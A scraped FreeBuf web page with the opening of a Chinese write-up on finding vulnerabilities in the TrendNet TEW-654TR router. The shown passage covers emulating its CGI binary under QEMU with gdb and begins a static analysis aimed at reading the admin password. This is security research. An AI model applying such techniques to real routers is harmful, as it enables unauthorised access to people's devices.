<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!--
                              _.._        ,------------.
                           ,'      `.    ( We want you! )
                          /  __) __` \    `-,----------'
                         (  (`-`(-')  ) _.-'
                         /)  \  = /  (
                        /'    |--' .  \
                       (  ,---|  `-.)__`
                        )(  `-.,--'   _`-.
                       '/,'          (  Uu",
                        (_       ,    `/,-' )
                        `.__,  : `-'/  /`--'
                          |     `--'  |
                          `   `-._   /
                           \        (
                           /\ .      \.  freebuf
                          / |` \     ,-\
                         /  \| .)   /   \
                        ( ,'|\    ,'     :
                        | \,`.`--"/      }
                        `,'    \  |,'    /
                       / "-._   `-/      |
                       "-.   "-.,'|     ;
                      /        _/["---'""]
                     :        /  |"-     '
                     '           |      /
                                 `      |
-->
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>
  TEW-654TR路由器漏洞分析和挖掘 - FreeBuf.COM | 关注黑客与极客</title>
<meta name="description" content="* 原创作者：影武者实验室，本文属FreeBuf原创奖励计划，未经许可禁止转载
0&#215;00 前言&nbsp;
拜读完devttys0前辈的&#8221;exploiting embedded systems&#8221;系列.分析了下相关固件&nbsp;    路由器型号: TEW-…" />
<meta name="keywords" content="TEW-654TR, 路由器漏洞, 最新漏洞报告,漏洞众测平台,漏洞攻击分析,漏洞POC和EXP, 终端安全" />
<meta name="baidu-site-verification" content="nKKKqQxp6R" />
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="renderer" content="webkit">
<meta property="qc:admins" content="6620477777662552566375" />
<link rel='stylesheet' id='wpfp-css' href='http://www.freebuf.com/buf/plugins/wp-favorite-posts/wpfp.css' type='text/css' />
<link rel='stylesheet' id='wp-recentcomments-css'  href='http://static.3001.net/css/recentcomments/wp-recentcomments.css?ver=2.2.3' type='text/css' media='screen' />
<link rel='stylesheet' id='mycred-widget-css'  href='http://www.freebuf.com/buf/plugins/gold/assets/css/widget.css?ver=1.3.2.1' type='text/css' media='all' />
<script type='text/javascript' src='http://static.3001.net/js/header/jquery.min.js?ver=3.6.1'></script>
<script type='text/javascript' src='http://www.freebuf.com/buf/plugins/wp-favorite-posts/wpfp.js?ver=3.6.1'></script>
<link rel='prev' title='美国DHS发布《“灰熊草原”网络攻击活动深入分析报告》' href='http://www.freebuf.com/special/126918.html' />
<link rel='next' title='伊朗黑客对中东发起名为Magic Hound的网络间谍行为' href='http://www.freebuf.com/news/127211.html' />
<link rel='canonical' href='http://www.freebuf.com/vuls/126766.html' />
<link rel='shortlink' href='http://www.freebuf.com/?p=126766' />

<link rel="stylesheet" href="http://static.3001.net/css/highslide/highslide.css" type="text/css" />
<script type="text/javascript" src="http://static.3001.net/js/highslide/highslide-with-html.packed.js"></script>
<script type="text/javascript">
jQuery(document).ready(function($) {
    hs.graphicsDir = "http://www.freebuf.com/buf/plugins/auto-highslide/images/graphics/";
    hs.outlineType = "rounded-white";
    hs.dimmingOpacity = 0.8;
    hs.outlineWhileAnimating = true;
    hs.showCredits = false;
    hs.captionEval = "this.thumb.alt";
    hs.numberPosition = "caption";
    hs.align = "center";
    hs.transitions = ["expand", "crossfade"];
    hs.addSlideshow({
        interval: 5000,
        repeat: true,
        useControls: true,
        fixedControls: "fit",
        overlayOptions: {
            opacity: 0.75,
            position: "bottom center",
            hideOnMouseOut: true

        }

    });
});
</script>
          <script language="JavaScript" type="text/javascript" src="http://www.freebuf.com/buf/plugins/cartpauj-pm/js/script.js"></script>
      <link rel="stylesheet" type="text/css" href="http://www.freebuf.com/buf/plugins/cartpauj-pm/style/style.css" />
      <script type="text/javascript" src="http://www.freebuf.com/buf/plugins/simditor/highlight/highlight.pack.js"></script><link type="text/css" rel="stylesheet" href=" http://www.freebuf.com/buf/plugins/simditor/highlight/styles/default.css" />	<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
<link rel="shortcut icon" href="http://static.freebuf.com/images/favicon.ico" />
<link rel="stylesheet" href="http://static.3001.net/css/new/header.css" />
<link href="http://static.3001.net/css/new/bootstrap.min.css?ver=2016051701" rel="stylesheet" media="screen">
    <!--轮播图-->
    <link href="http://static.3001.net/css/new/swiper-3.4.2.min.css" rel="stylesheet" type="text/css">
    <link href="http://static.3001.net/css/new/style.css?ver=20170912568" rel="stylesheet" type="text/css">
    <style type="text/css">
#contenttxt hr {
  display: block;
  height: 0px;
  border: 0;
  border-top: 1px solid #ccc;
  margin: 15px 0;
  padding: 0;
}
#contenttxt table {
  width: 100%;
  table-layout: fixed;
  border-collapse: collapse;
  border-spacing: 0;
  margin: 15px 0;
}
#contenttxt table thead {
  background-color: #f9f9f9;
}
#contenttxt table td, #contenttxt table th {
  min-width: 40px;
  height: 30px;
  border: 1px solid #ccc;
  vertical-align: top;
  padding: 2px 4px;
  text-align: left;
  box-sizing: border-box;
  white-space: pre-wrap; white-space: -moz-pre-wrap; white-space: -pre-wrap; white-space: -o-pre-wrap; word-wrap: break-word;
}
#contenttxt table td.active, #contenttxt table th.active {
  background-color: #ffffee;
  white-space: pre-wrap; white-space: -moz-pre-wrap; white-space: -pre-wrap; white-space: -o-pre-wrap; word-wrap: break-word;
}
</style>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/jquery-2.0.3.min.js"></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/bootstrap.min.js"></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/slider.js?2016022501.1" type="text/javascript"></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/jquery.sticky.js" type="text/javascript"></script>
<script src="http://static.3001.net/js/focus/bjqs-1.3.min.js" type="text/javascript" ></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/mosaic.1.0.1.min.js" type="text/javascript" ></script>
<script type="text/javascript" src="http://static.3001.net/js/new/setint.js"></script>
    <!--轮播图-->
    <script src="http://static.3001.net/js/colum/swiper-3.4.2.min.js"></script>
<!--[if lt IE 9]>
    <script src="http://www.freebuf.com/buf/themes/freebuf/js/html5shiv.min.js"></script>
    <script src="http://www.freebuf.com/buf/themes/freebuf/js/respond.min.js"></script>
<![endif]-->
    <style>
        @font-face {font-family: 'iconfont';
            src: url('http://static.3001.net/iconfont/iconfont.eot'); /* IE9*/
            src: url('http://static.3001.net/iconfont/iconfont.eot?#iefix') format('embedded-opentype'), /* IE6-IE8 */
            url('http://static.3001.net/iconfont/iconfont.woff') format('woff'), /* chrome、firefox */
            url('http://static.3001.net/iconfont/iconfonticonfont.ttf') format('truetype'), /* chrome、firefox、opera、Safari, Android, iOS 4.2+*/
            url('http://static.3001.net/iconfont/iconfont.svg#iconfont') format('svg'); /* iOS 4.1- */
        }
    </style>
</head>

<body>
<!----------header---------->
<!--头部导航-->
<div id="undefined-sticky-wrapper" class="sticky-wrapper is-sticky">
    <div class="main-header">
        <div class="header">
            <div class="header-container clearfix">
                                <div class="header-logo"><a href="http://www.freebuf.com"></a></div>
                                        <!-- column -->
                        <div class="nav">
                            <ul class="nav-child clearfix">
                                <li class=" index">
                                    <a href="http://www.freebuf.com">首页</a></li>
                                <li data-value="read-menu">
                                    <a href="#">分类阅读<b class="triangle-down triangle-down-04"></b></a>
                                </li>
                                <li data-value="wenku-menu"><a href="javascript:;" target="_blank">文库<b class="triangle-down triangle-down-04"></b></a></li>
                                <li>
                                    <a href="http://zhuanlan.freebuf.com" target="_blank">专栏</a><b class="icon-betr"></b>
                                </li>
                                <li><a href="http://open.freebuf.com" target="_blank">公开课</a></li>
                                <li><a href="http://shop.freebuf.com" target="_blank">商城</a></li>
                                <li data-value="company-menu"><a href="javascript:;" >企业服务<b class="triangle-down triangle-down-04"></b></a></li>
                                <li data-value="user-menu"><a href="javascript:;" >用户服务<b class="triangle-down triangle-down-04"></b></a></li>
                            </ul>
                        </div>
                                        <div class="header-right">
                                    <div class="loginSign login-before">
                        <a href="https://account.tophant.com/register.html" class="login-btn">注册</a>
                        |
                        <a href="http://www.freebuf.com/oauth" class="sign-btn">登录</a>
                    </div>
                                    <!--搜索-->
                    <div class="search-form-inner clearfix">
                        <i class="searchdisplayico"></i>
                        <div class="form-group has-active search-col search-form-text">
                            <form id="hpsform-new" class="navbar-search navbar-form" onsubmit="return dispatch();">
                                <div class="form-group">
                                    <input id="bigq" class="input form-control" type="text" placeholder="关键字查找" autocomplete="off" title="关键字查找" name="q">
                                    <button class="submit" type="submit"></button>
                                </div>
                            </form>
                        </div>
                    </div>
                    <!--<script>
                        $('.search-form-inner .searchdisplayico').click(function(event) {
                            var evt = evt || event;
                            evt.stopPropagation();
                            $(this).siblings('.search-col').addClass('active');
                        });
                        $('.search-form-inner .search-col').click(function(event) {
                            var evt = evt || event;
                            evt.stopPropagation();
                            $('.search-form-inner .search-col').addClass('active');
                        });
                        $(document).click(function() {
                            $('.search-form-inner .search-col').removeClass('active');
                        });
                    </script>-->
                                    <div class="btn-publish">
                        <a href="#">投稿</a>
                        <div class="btn-publish-child">
                            <ul class="btn-child clearfix">
                                <li><a href="http://my.freebuf.com/post/edit/" target="_blank">文章撰写</a></li>
                                <li><hr/></li>
                                <li><a href="http://my.freebuf.com/post/article/" target="_blank">投稿管理</a></li>
                                                        </ul>
                        </div>
                    </div>
                </div>
                <div class="nav-small">
                    <a href="#">&#xe634;</a>
                    <ul class="nav-child clearfix">
                                                        <li class=" index">
                                    <a href="http://www.freebuf.com">首页</a></li>
                                <li class="read-classify">
                                    <a href="#">分类阅读<b class="icon-arrow"></b></a>
                                    <ul class="nav-child2 read-classify clearfix">
                                        <li>
                                            <strong>黑客</strong>
                                            <div class="nav-item">
                                                <a href="http://www.freebuf.com/vuls" target="_blank">漏洞</a>
                                                <a href="http://www.freebuf.com/sectool" target="_blank">安全工具</a>
                                                <a href="http://www.freebuf.com/articles/web" target="_blank">WEB安全</a>
                                                <a href="http://www.freebuf.com/articles/system" target="_blank">系统安全</a>
                                                <a href="http://www.freebuf.com/articles/network" target="_blank">网络安全</a>
                                                <a href="http://www.freebuf.com/articles/wireless" target="_blank">无线安全</a>
                                                <a href="http://www.freebuf.com/articles/terminal" target="_blank">设备/客户端安全</a>
                                                <a href="http://www.freebuf.com/articles/database" target="_blank">数据库安全</a>
                                                <a href="http://www.freebuf.com/articles/security-management" target="_blank">安全管理</a>
                                                <a href="http://www.freebuf.com/articles/es" target="_blank">企业安全</a>
                                                <a href="http://www.freebuf.com/ics-articles" target="_blank">工控安全</a>
                                            </div>
                                        </li>
                                        <li>
                                            <strong>极客</strong>
                                            <div class="nav-item">
                                                <a href="http://www.freebuf.com/geek" target="_blank">极客有意思</a>
                                                <a href="http://www.freebuf.com/news/others" target="_blank">周边</a>
                                            </div>
                                        </li>
                                        <li>
                                            <strong>特色</strong>
                                            <div class="nav-item">
                                                <a href="http://www.freebuf.com/news/special" target="_blank">头条</a>
                                                <a href="http://www.freebuf.com/articles/people" target="_blank">人物志</a>
                                                <a href="http://www.freebuf.com/fevents" target="_blank">活动</a>
                                                <a href="http://www.freebuf.com/video" target="_blank">视频</a>
                                                <a href="http://www.freebuf.com/articles/neopoints" target="_blank">观点</a>
                                                <a href="http://www.freebuf.com/jobs" target="_blank">招聘</a>
                                                <a href="http://www.freebuf.com/paper/" target="_blank">报告</a>
                                            </div>
                                        </li>
                                    </ul>
                                </li>
                                <li><a href="http://zhuanlan.freebuf.com/" target="_blank">专栏</a></li>
                                <li><a href="http://open.freebuf.com" target="_blank">公开课</a></li>
                                <li><a href="http://shop.freebuf.com" target="_blank">商城</a></li>
                                <li>
                                    <a href="javascript:;" target="_blank">企业服务<b class="icon-arrow"></b></a>
                                    <ul class="nav-child2">
                                        <li>
                                            <a href="https://www.vulbox.com/bounties/item-9-0-1" target="_blank"><strong>企业SRC</strong></a>
                                        </li>
                                        <li>
                                            <a href="http://company.freebuf.com" target="_blank"><strong>企业空间</strong></a>
                                        </li>
                                        <li>
                                            <a href="https://www.vulbox.com/" target="_blank"><strong>安全测试</strong></a>
                                        </li>
                                        <li>
                                            <a href="https://www.riskivy.com/" target="_blank"><strong>风险感知</strong></a>
                                        </li>

                                    </ul>
                                </li>
                                <li>
                                    <a href="javascript:;" target="_blank">用户服务<b class="icon-arrow"></b></a>
                                    <ul class="nav-child2">
                                        <li>
                                            <a href="http://www.freebuf.com/newsend" target="_blank"><strong>有奖投稿</strong></a>
                                        </li>
                                        <li>
                                            <a href="http://zhuanlan.freebuf.com" target="_blank">
                                        </li>
                                        <li>
                                            <a href="https://www.vulbox.com/bounties/detail-72" target="_blank"><strong>提交漏洞</strong></a>
                                        </li>
                                        <li class="last">
                                            <a href="https://www.vulbox.com/bounties" target="_blank"><strong>参与众测</strong></a>
                                        </li>
                                    </ul>
                                </li>
                                <li>
                                    <a href="javascript:;" target="_blank">文库<b class="icon-arrow"></b></a>
                                    <ul class="nav-child2">
                                        <li>
                                            <a href="http://www.freebuf.com/wenku" target="_blank"><strong>文库</strong></a>
                                        </li>
                                        <li>
                                            <a href="http://www.freebuf.com/special-subject" target="_blank"><strong>专题</strong></a>
                                        </li>
                                    </ul>
                                </li>
                                                    <li><a href="http://my.freebuf.com/post/edit" target="_blank">投稿</a></li>
                                                    <li><a href="https://account.tophant.com/register.html" class="login-btn">注册</a>
                            </li>
                            <li><a href="http://www.freebuf.com/oauth" class="sign-btn">登录</a></li>
                                            </ul>
                </div>
            </div>
            <div class="dropdown-menu read-menu" id="read-menu">
                <div class="container">
                    <ul class="menu clearfix">
                        <li>
                            <strong>黑客</strong>
                            <div class="nav-item">
                                <a href="http://www.freebuf.com/vuls" target="_blank">漏洞</a>
                                <a href="http://www.freebuf.com/sectool" target="_blank">安全工具</a>
                                <a href="http://www.freebuf.com/articles/web" target="_blank">WEB安全</a>
                                <a href="http://www.freebuf.com/articles/system" target="_blank">系统安全</a>
                                <a href="http://www.freebuf.com/articles/network" target="_blank">网络安全</a>
                                <a href="http://www.freebuf.com/articles/wireless" target="_blank">无线安全</a>
                                <a href="http://www.freebuf.com/articles/terminal" target="_blank">设备/客户端安全</a>
                                <a href="http://www.freebuf.com/articles/database" target="_blank">数据库安全</a>
                                <a href="http://www.freebuf.com/articles/security-management" target="_blank">安全管理</a>
                                <a href="http://www.freebuf.com/articles/es" target="_blank">企业安全</a>
                                <a class="last" href="http://www.freebuf.com/ics-articles" target="_blank">工控安全</a>
                            </div>
                        </li>
                        <li>
                            <strong>极客</strong>
                            <div class="nav-item">
                                <a href="http://www.freebuf.com/geek" target="_blank">极客有意思</a>
                                <a class="last" href="http://www.freebuf.com/news/others" target="_blank">周边</a>
                            </div>
                        </li>
                        <li>
                            <strong>特色</strong>
                            <div class="nav-item">
                                <a href="http://www.freebuf.com/news/special" target="_blank">头条</a>
                                <a href="http://www.freebuf.com/articles/people" target="_blank">人物志</a>
                                <a href="http://www.freebuf.com/fevents" target="_blank">活动</a>
                                <a href="http://www.freebuf.com/video" target="_blank">视频</a>
                                <a href="http://www.freebuf.com/articles/neopoints" target="_blank">观点</a>
                                <a href="http://www.freebuf.com/jobs" target="_blank">招聘</a>
                                <a class="last" href="http://www.freebuf.com/paper/" target="_blank">报告</a>
                            </div>
                        </li>
                    </ul>
                </div>
            </div>
            <div class="dropdown-menu company-menu" id="company-menu">
                <div class="container">
                    <ul class="menu">
                        <li>
                            <a href="https://www.vulbox.com/bounties/item-9-0-1" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-src.png"></span>
                                <span class="name">企业SRC</span>
                                <span class="intro">全/半托管式互联网漏洞收集管理</span>
                            </a>
                        </li>
                        <li>
                            <a href="http://company.freebuf.com" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-company.png"></span>
                                <span class="name">企业空间</span>
                                <span class="intro">为企业定制信息安全专属门户</span>
                            </a>
                        </li>
                        <li>
                            <a href="https://www.vulbox.com/" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-safety.png"></span>
                                <span class="name">安全测试</span>
                                <span class="intro">国内领先的互联网安全众测服务</span>
                            </a>
                        </li>
                        <li class="last">
                            <a href="https://www.riskivy.com/" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-risk.png"></span>
                                <span class="name">风险感知</span>
                                <span class="intro">基于IT资产的自动化安全监控</span>
                            </a>
                        </li>

                    </ul>
                </div>
            </div>
            <div class="dropdown-menu user-menu" id="user-menu">
                <div class="container">
                    <ul class="menu">
                        <li>
                            <a href="http://www.freebuf.com/newsend" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-write.png"></span>
                                <span class="name">有奖投稿</span>
                                <span class="intro">与整个行业分享你的经验与见解</span>
                            </a>
                        </li>
                        <li>
                            <a href="http://zhuanlan.freebuf.com" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-column.png"></span>
                                <span class="name">申请专栏</span>
                                <span class="intro">自由创作，打造自主内容品牌</span>
                            </a>
                        </li>
                        <li>
                            <a href="https://www.vulbox.com/bounties/detail-72" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-leak.png"></span>
                                <span class="name">提交漏洞</span>
                                <span class="intro">与数万白帽一起，让互联网更安全</span>
                            </a>
                        </li>
                        <li class="last">
                            <a href="https://www.vulbox.com/bounties" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-test.png"></span>
                                <span class="name">参与众测</span>
                                <span class="intro">挖洞开启自由职业之路</span>
                            </a>
                        </li>
                    </ul>
                </div>
            </div>
            <div class="dropdown-menu wenku-menu" id="wenku-menu">
                <div class="container">
                    <ul class="menu">
                        <li>
                            <a href="http://www.freebuf.com/wenku" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-write.png"></span>
                                <span class="name">文库</span>
                                <span class="intro">最全的FB百科</span>
                            </a>
                        </li>
                        <li class="last">
                            <a href="http://www.freebuf.com/special-subject" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-test.png"></span>
                                <span class="name">专题</span>
                                <span class="intro">浓缩的安全精华汇总</span>
                            </a>
                        </li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
</div>
<!----------header end---------->
<!--<script type="application/javascript">
    var  _value_tab = '';
    $(function(){
        var _that = '', _show_flag = 0;
        $('.header .header-container .nav .nav-child > li:not(input[data-value])').mouseover(function() {
            $('.header .dropdown-menu').stop().slideUp(50);
        });
        $('.header').mouseout(function() {
            $('.header .dropdown-menu').stop().slideUp(50);
        });
        /*$('.header .header-container .nav .nav-child > li').mouseover(function() {
         _value_tab = $(this).attr('data-value');
         $('#'+_value_tab).siblings('.dropdown-menu').stop().slideUp(50);
         $('#'+_value_tab).stop().slideDown(100);
         });*/
        $(".header .header-container .nav .nav-child > li").hoverDelay({
            hoverDuring: 500,
            hoverEvent: function(){
                $('#'+_value_tab).siblings('.dropdown-menu').stop().slideUp(50);
                $('#'+_value_tab).stop().slideDown(100);
            }
        });
        $('.header .dropdown-menu').mouseover(function() {
            _value_tab = $(this).attr('id');
            _that = this;
            $('.nav-child li[data-value="'+_value_tab+'"]').addClass('hover');
            $(this).stop().slideDown(50);
        }).mouseout(function() {
            $('.nav-child li[data-value="'+_value_tab+'"]').removeClass('hover');
            $(_that).stop().slideUp(50);
        });

        $(".nav-small .nav-child > li").click(function(event){
            var ev = ev || event;
            ev.stopPropagation();

            if($(this).find('.nav-child2').is(":hidden")) {
                _show_flag = 1;
                $(this).find('.nav-child2').slideDown();
                $(this).find('.icon-arrow').addClass('bottom');
            }else {
                _show_flag = 0;
                $(this).find('.nav-child2').slideUp();
                $(this).find('.icon-arrow').removeClass('bottom');
            }
            $(this).siblings().find('.nav-child2').slideUp();
            $(this).siblings().find('.icon-arrow').removeClass('bottom');
        });
        //头部投稿按钮hover状态展开菜单
        $(".btn-publish-child > ul > li").hover(function(){
            $(this).addClass("active");
            $(this).siblings().removeClass("active");
        });

        $(document).click(function(event){
            var ev = ev || event;
            $(".login-after").find(".login-after-child").hide();
        });
        //点击用户信息，出现下拉菜单
        $("#user-info").click(function(event){
            var ev = ev || event;
            ev.stopPropagation();
            $(".login-after").find(".login-after-child").toggle();
        });
        //顶部导航
        $(".nav-small").click(function(){
            $(this).find(".nav-child").slideToggle();
        });
        var that = '';
        $('.header .header-container .nav .nav-child > li').mouseover(function() {
            that = this;
            $(this).find('.dropdown-menu').stop().slideDown(200);
        }).mouseout(function() {
            $(that).find('.dropdown-menu').stop().slideUp(200);
        });
    });
    $(".nav-small .nav-child > li").click(function(event){
        var ev = ev || event;
        ev.stopPropagation();
        $(this).siblings('li').find('.dropdown-menu').hide();
        $(this).find(".dropdown-menu").toggle();
    });
    //鼠标经过(hover)事件的延时处理
    (function($){
        $.fn.hoverDelay = function(options){
            var defaults = {
                hoverDuring: 100,
                outDuring: 100,
                hoverEvent: function(){
                    $.noop();
                },
                outEvent: function(){
                    $.noop();
                }
            };
            var sets = $.extend(defaults,options || {});
            var hoverTimer, outTimer;
            return $(this).each(function(){
                $(this).hover(function(){
                    _value_tab = $(this).attr('data-value');
                    clearTimeout(outTimer);
                    hoverTimer = setTimeout(sets.hoverEvent, sets.hoverDuring);
                },function(){
                    clearTimeout(hoverTimer);
                    outTimer = setTimeout(sets.outEvent, sets.outDuring);
                });
            });
        }
    })(jQuery);
</script>-->
<script type="text/javascript" src="http://static.3001.net/js/header/header.js"></script><script>
    jQuery(window).load(function(){
      if(jQuery(window).width()>480){
        jQuery(".main-header").sticky({ topSpacing: 0 });
      }else{
        jQuery(".main-header nav").removeClass("navbar-fixed-top");
      }
      jQuery("#mar-right").sticky({ topSpacing: 105,bottomSpacing: 410 });
    });
</script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/layer.js"></script>
<script type="text/javascript" src="http://static.3001.net/js/pretty/prettify.js"></script>
<script type="text/javascript" src="http://static.3001.net/js/header/lazyload.js"></script>
<script type="text/javascript" charset="utf-8">
      jQuery(function() {
          jQuery("img").lazyload({
              effect : "fadeIn"
          });
      });
 </script>
<script type="text/javascript">
    window.onload = function(){
        prettyPrint();
    }
</script>
<script language="JavaScript" type="text/javascript">
//<![CDATA[
var va = "您已经点亮过了";
function acv_vote(id,option, m){
  if( m==null) m =''; m = m + '';
  jQuery('#acv_stat_'+m+id).html('Loading...');
  var url="http://www.freebuf.com/index.php?acv_ajax=true&option="+option+"&ID="+id;
  jQuery.get(url,function(d){
    d =d.split('|');var s='#acv_stat_'+m+d[0];
    var sele = '#cos_support-'+m+id,unsele = '#cos_unsupport-'+m+id,tpjs = 'javascript:alert(va)';
    jQuery( s ).html( d[1] );jQuery(s).fadeOut(400,function(){jQuery(s).fadeIn();});
    if( d[2] == 1 ){ jQuery(sele).html(jQuery(sele).html()*1+1); }
    if( d[2] == -1 ){ jQuery(unsele).html(jQuery(unsele).html()*1+1); }
    jQuery('#vote4-'+id).attr('href',tpjs);jQuery('#vote4-2'+id).attr('href',tpjs);
    jQuery('#votea-'+id).attr('href',tpjs);jQuery('#votea-2'+id).attr('href',tpjs);
  });
}
  
$(document).on("mouseenter",".comment-tools",function(){
  $(this).find(".btn-report").show();
  $(this).find(".btn-report").addClass("hover");
}).on("mouseleave",".comment-tools",function(){
  var $_this = $(this);
  $(this).find(".btn-report").removeClass("hover");
  if(!$(this).find(".dropup").hasClass('open')){
    $(this).find(".btn-report").hide(); 
    $_this.find(".dropdown-menu").css("display","none");
  }else{
    setTimeout(function(){
      if(!$_this.find(".btn-report").hasClass("hover")){
        $_this.find(".dropup").removeClass("open");
        $_this.find(".dropdown-menu").css("display","none");
        $_this.find(".btn-report").hide(); 
      }
    },"500");
  }
})

$(document).on("click",".click_report",function(){
  $(this).parent().parent().css("display","none");
  var id = $(this).attr("data-id");
  var url="http://www.freebuf.com/index.php?acv_ajax=true&option=0&ID="+id;
  $_this = $(this);
  jQuery.get(url,function(d){
    d =d.split('|');
    if(d[1]=='您已经点过灯了'){
      d[1] = '您已经举报过了';
    }
    if(d[1]=='Thank you'){
      d[1] = '举报成功';
    }
    $_this.parent().parent().parent().find(".btn-report").text(d[1]);
    $_this.parent().parent().parent().find(".btn-report").css("display","block");
  })
})

$(document).on("click",".btn-report",function(){
  if($(this).parent().hasClass('open')){
    $(this).parent().find(".dropdown-menu").css("display","block");
  }else{
    $(this).parent().find(".dropdown-menu").css("display","none");
  }
})
//]]>
</script>
<div class="column-article" data-column="">
            <div class="container pad-top35">
        <div class="row clearfix">
            <div class="col-md-9" id="getWidth">
                                    <div class="reletive search-xs-wrap">
                    <div class="form-group has-active search-col search-xs">
                        <form id="hpsform-new" class="navbar-search navbar-form" onsubmit="return dispatch()">
                            <div class="form-group">
                                <input id="q" class="input form-control" type="text" placeholder="关键字查找" autocomplete="off" title="关键字查找" name="q">
                                <button class="submit" type="submit"></button>
                            </div>
                        </form>
                    </div>
                </div>
                    <script type="text/javascript">
                        var dispatch = function () {
                            console.log(123)
                            var q = document.getElementById("q");
                            if (q.value == "") {
                                q = document.getElementById("bigq");
                            }
                            if (q.value != "") {
                                window.open('http://www.freebuf.com/?s=' + q.value, "_blank");
                                return false;
                            } else {
                                return false;
                            }
                        }
                    </script>
                                <div class="article-wrap panel panel-default">
                                                            <div class="articlecontent">
                                                    <div class="title">
                                <h2>
                                    TEW-654TR路由器漏洞分析和挖掘                                </h2>
                                <div class="property">
                                                                            <span class="name"><a href="http://www.freebuf.com/author/%e5%bd%b1%e6%ad%a6%e8%80%85%e5%ae%9e%e9%aa%8c%e5%ae%a4" title="由 影武者实验室 发布" rel="author">影武者实验室</a></span>
                                                                        <span class="icon-f"></span>
                                    <span class="time">2017-02-20</span>
                                                                                                                <span class="rmb"><img title="现金奖励" src="http://image.3001.net/images/new/icon-m.jpg"/></span>
                                                                        <span class="look">共<strong>901387</strong>人围观
                                        ，发现 <strong>9</strong> 个不明物体 </span>                                      </span>
                                                                <span class="tags">
                                      <a href="http://www.freebuf.com/./vuls">漏洞</a><a href="http://www.freebuf.com/./articles/terminal">终端安全</a></span>
                                    <span class="tags_01"></span>
                                </div>
                            </div>
                                                                                                <div id="contenttxt">
                            <p><b><span style="color: rgb(51, 51, 51);"><b style="color: rgb(239, 71, 71);">* 原创作者：影武者实验室，本文属FreeBuf原创奖励计划，未经许可禁止转载</b><br /></span></b></p>
<h2><b><span style="color: rgb(51, 51, 51);">0&#215;00 前言&nbsp;</span></b><br /></h2>
<p><b style="color: rgb(0, 176, 80);">拜读完devttys0前辈的&#8221;exploiting embedded systems&#8221;系列.分析了下相关固件&nbsp;</b>    <br />路由器型号: TEW-654TR&nbsp;    <br />固件下载地址:&nbsp;<a href="http://download.trendnet.com/TEW-654TR/firmware/">http://download.trendnet.com/TEW-654TR/firmware/</a></p>
<hr />
<h2>0&#215;01 环境设置</h2>
<p style="text-align: center;"><img alt="1.png" data-original="http://image.3001.net/images/20170208/14865505315396.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="690" height="564">    </p>
<noscript><img alt="1.png" src="http://image.3001.net/images/20170208/14865505315396.png!small" width="690" height="564">    </p></noscript>
<pre><code>#!/bin/bash

INPUT="$1"
LEN=$(echo -n "$INPUT" | wc -c)
PORT="1234"

if [ "$LEN" == "0" ] || [ "$INPUT" == "-h" ] || [ "$UID" != "0" ]
then
    echo -e "\nUsage: sudo $0 \n"
    exit 1
fi

cp $(which qemu-mipsel-static) ./qemu

echo "$INPUT" | chroot . ./qemu -E REQUEST_METHOD="POST" -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REMOTE_ADDR="1.1.1.100" -g $PORT /usr/bin/my_cgi.cgi 2&gt;/dev/null

rm -f ./qemu</code></pre>
<p>这里因为是小端机mips架构,所以复制了qemu-mipsel-static,mips架构跟intel架构在漏洞挖掘思路上并没有什么不同,只是利用有区别,例如溢出时要判断是否是叶子函数等等.&nbsp;    <br />因为cgi脚本里有getenv的动作,所以用-E设置env,-g指定了gdb远程调试的端口. /usr/bin/my_cgi.cgi是在读配置文件的时候取得的,当然 这个也能从真实提交请求的时候看到.</p>
<hr />
<h2>0&#215;02 漏洞分析一:读取路由器admin账号密码</h2>
<p>真实的登录请求包:&nbsp;    <br /><code>request=login&amp;user_name=admin&amp;user_pwd=password</code></p>
<p>在静态分析的时候,可以直接查询相关关键字,定位到登录函数的位置.&nbsp;    <br />这里搜索request,定位到主函数内</p>
<p style="text-align: center;"><img alt="2.png" data-original="http://image.3001.net/images/20170208/14865505531916.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="690" height="107">    </p>
<noscript><img alt="2.png" src="http://image.3001.net/images/20170208/14865505531916.png!small" width="690" height="107">    </p></noscript>
<p>首先保存现场到栈上,然后call getenv(&#8220;REQUEST_METHOD&#8221;),获取不到的话,跳到loc_40914c处从栈上恢复s0-s7、fp、ra的值,然后跳转到ra重新调用getenv.&nbsp;    <br />返回true的话再进行判断是get亦或post方法</p>
<p style="text-align: center;"><img alt="3.png" data-original="http://image.3001.net/images/20170208/14865505858920.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="690" height="788">    </p>
<noscript><img alt="3.png" src="http://image.3001.net/images/20170208/14865505858920.png!small" width="690" height="788">    </p></noscript>
<p style="text-align: center;"><img alt="4.png" data-original="http://image.3001.net/images/20170208/14865506011836.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="690" height="542">    </p>
<noscript><img alt="4.png" src="http://image.3001.net/images/20170208/14865506011836.png!small" width="690" height="542">    </p></noscript>
<p>获取length、type、remote_addr等值之后,向下跟踪发现有打开数据库的动作.</p>
